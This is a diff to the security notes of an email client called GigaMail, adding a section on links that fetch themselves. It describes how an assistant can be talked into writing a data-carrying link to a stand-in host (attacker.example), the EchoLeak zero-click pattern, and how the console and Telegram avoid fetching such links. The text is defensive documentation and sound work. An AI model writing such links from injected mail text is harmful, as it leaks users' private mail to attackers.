@@ -354,6 +354,24 @@ What this does not stop, stated plainly:
   that runs commands, keep its command approvals on, or run its commands in
   a container that cannot see GigaMail's data folder.
 
+## Links that fetch themselves
+
+An assistant can be talked into writing a link that carries data
+(`https://attacker.example/?d=...`), and some places open such a link with
+no click: an image loaded on display, or a chat app that previews the first
+link of a message by fetching it (the EchoLeak pattern). GigaMail shows text
+written by an agent in two places, and neither fetches anything:
+
+- **The agent bar in the console** escapes the answer; the only link that
+  becomes clickable is GigaMail's own `gigamail://mail/...`, and no image is
+  loaded.
+- **Telegram** messages are sent with link previews disabled, every one of
+  them (`telegram_channel.Telegram._call`), so a draft shown for approval
+  does not make Telegram's servers open its links.
+
+A link in a draft still goes out if the person approves the draft: the
+approval preview is where to look at it.
+
 ## Hidden text: the agent reads what the person sees
 
 A mail can address the agent in text the person never sees: a block with
